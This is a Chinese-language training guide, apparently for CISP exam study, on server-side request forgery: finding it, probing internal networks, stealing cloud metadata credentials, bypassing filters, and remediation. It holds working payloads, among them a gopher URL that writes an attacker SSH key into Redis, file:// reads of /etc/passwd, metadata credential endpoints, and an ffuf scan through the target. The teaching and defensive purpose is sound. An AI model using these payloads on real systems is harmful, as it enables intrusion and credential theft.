# SSRF 漏洞挖掘与内网探测

> **📘 文档定位**：CISP 考试 漏洞挖掘 核心 | 难度：⭐⭐⭐⭐ | 预计阅读：28 分钟
>
> 系统讲解 SSRF 漏洞的挖掘方法、内网探测技术、云元数据攻击及多种绕过技巧（IP格式/DNS Rebinding/302跳转），是内网渗透的前置关键技能。

---

## 导航目录

- [一、漏洞概述](#一漏洞概述)
- [二、SSRF 挖掘方法](#二ssrf-挖掘方法)
- [三、内网探测技术](#三内网探测技术)
- [四、云元数据攻击](#四云元数据攻击)
- [五、Bypass 绕过技巧](#五bypass-绕过技巧)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 一、漏洞概述

服务端请求伪造（Server-Side Request Forgery，SSRF）是指攻击者通过可控参数迫使服务端发起 HTTP / TCP 请求，利用服务端身份访问其可达资源，尤其是内网、本地回环、云元数据接口、数据库服务等通常被边界防火墙阻断的目标。

| 项目 | 说明 |
|------|------|
| 典型危害 | 内网资产探测、Redis 未授权写 SSH Key、云平台凭证窃取、DoS、XXE RCE 等 |
| 常见参数名 | `url`、`redirect_url`、`img_url`、`proxy`、`callback`、`endpoint`、`webhook` |
| 常见功能点 | 图片 / 视频远程加载、订阅源抓取、在线加载 PDF、微信公众号接口、第三方 OAuth 回调 |
| 工具推荐 | Gopherus、redis-rogue-server、SSRFmap、Burp Collaborator |

## 2. SSRF 发现思路

### 2.1 参数定位

重点关注能"指向某个 URL"的参数。以下是常见模式：

```
GET /fetch?img=http://cdn.example.com/logo.png
GET /proxy?url=https://news.example.com/rss
POST /pdf { "source": "https://example.com/doc" }
GET /share?redirect_url=http://example.com/landing
GET /webhook?callback=http://api.example.com/hook
```

### 2.2 基础验证流程

1. **替换目标为公网回显服务**（如 Burp Collaborator、`httpbin.org/ip`、自建 nginx），观察服务端是否发起了实际请求；
2. **访问本机端口**：`http://127.0.0.1:80/`、`http://127.0.0.1:6379/`、`http://127.0.0.1:22/`，根据响应差异判断端口开放；
3. **访问内网段**：`http://10.0.0.1/`、`http://192.168.0.1/`，观察响应包体是否包含内网页面标识；
4. **DNS Rebinding / 302 跳转**：若服务器使用 URL 白名单，尝试让目标域名 A 记录为内网 IP，或让白名单域名 302 到内网地址。

验证示例：

```bash
# 使用自建回显服务器观察 SSRF 触发
curl -s "https://target.com/fetch?url=http://my-collaborator.example.com/ssrf-test"
# 查看 my-collaborator.example.com 的 access.log，判断 User-Agent、源 IP、路径
```

## 3. 协议与利用链

### 3.1 HTTP(S) 协议

最直接的协议：直接读取内网 Web 服务、访问管理后台、命中 Nday。

```
http://127.0.0.1:8080/          # 本地调试 Web
http://192.168.1.1:80/          # 内网网关
http://169.254.169.254/latest/meta-data/   # AWS 元数据
http://metadata.google.internal/computeMetadata/v1/
http://[::ffff:169.254.169.254]/           # 绕过 IPv4 过滤
```

### 3.2 file 协议

若后端使用 `file_get_contents` / `fopen` 等 PHP 函数，且允许 `file://`，可直接读取本地文件：

```
file:///etc/passwd
file:///c:/windows/win.ini
file:///var/www/html/config.php
```

### 3.3 dict 协议

可探测端口 Banner，发送单行 TCP 协议命令：

```
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:3306/
dict://127.0.0.1:22/
```

### 3.4 gopher 协议（最强大）

gopher 可构造任意 TCP 流，常用于：

- 向 Redis 发送命令（写 SSH Key / 写 cron / 主从复制 RCE）
- 向 MySQL 发送未授权认证请求
- 向 FastCGI (9000) 构造请求
- 向 Memcached / Zookeeper / Elasticsearch 发送请求

典型 Redis 利用示例（向 6379 写入 SSH 公钥）：

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0assh-rsa AAAAB3N... attacker@host%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a
```

### 3.5 云元数据接口

在云服务器（AWS / 阿里云 / 腾讯云 / GCP / Azure）上可尝试：

```
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# 阿里云
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
```

## 4. 内网资产探测

### 4.1 内网段

常见内网地址段：

```
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
127.0.0.0/8
169.254.169.254/32
fd00::/8 (IPv6 ULA)
```

### 4.2 常用端口快速清单

| 端口 | 常见服务 | 利用点 |
|------|---------|-------|
| 22 | SSH | 口令暴力破解 / 弱密钥 / Redis 写 key |
| 6379 | Redis | 未授权、主从复制 RCE |
| 3306 | MySQL | 弱口令 / UDF / load_file |
| 27017 | MongoDB | 未授权访问 |
| 9200 | Elasticsearch | 未授权查询 / 低版本 RCE |
| 11211 | Memcached | 未授权读写 |
| 8080 | Tomcat / Jenkins | 管理后台、war 部署 |
| 2375 | Docker API | 未授权 → 创建容器 RCE |
| 10050 | Zabbix | 低版本 Agent RCE |

### 4.3 自动化探测

```bash
# 1. 编写端口/地址字典
# 2. 使用 Burp Intruder / ffuf / SSRFmap 批量请求
# 3. 依据响应长度 / 状态码 / 延迟差异判断存活

# 快速示例：使用 ffuf 扫描内网端口
ffuf -w ports.txt -u "https://target.com/fetch?url=http://127.0.0.1:FUZZ/" -fc 500
```

## 5. 常见绕过

| 限制 | 绕过思路 |
|------|---------|
| 仅允许 `example.com` 域名 | `http://example.com@127.0.0.1/`、`http://127.0.0.1#example.com/`（服务端解析差异） |
| 过滤 `127.0.0.1` | 使用十进制 `2130706433`、八进制、十六进制、`0`、`localhost`、`0x7f000001` |
| 过滤 IP 形式 | 使用 DNS 解析：自建域名 A 记录指向 127.0.0.1 |
| 仅允许 HTTP/HTTPS | 尝试 302 跳转 → gopher/file 二次利用（视后端实现） |
| HTTPS 证书校验严格 | 使用自签证书场景通常被拦截，重点转向 HTTP 内网资源 |

## 6. 修复建议

1. **白名单域名**：明确服务端仅能访问的域名前缀 / IP 段，拒绝任何未在白名单的目标。
2. **禁用危险协议**：在 HTTP 客户端配置中仅允许 `http` / `https`，禁用 `file://`、`dict://`、`gopher://`、`ftp://`。
3. **独立出网出口**：为 SSRF 功能分配独立的网络命名空间 / VPC，禁止访问内网与云元数据接口。
4. **URL 解析安全**：先解析 URL 得到 host/IP，再对 IP 做合法性检查（警惕 DNS rebinding，建议解析后直接使用 IP 访问且不做二次解析）。
5. **超时与速率限制**：避免被用于 DoS 攻击内网服务。
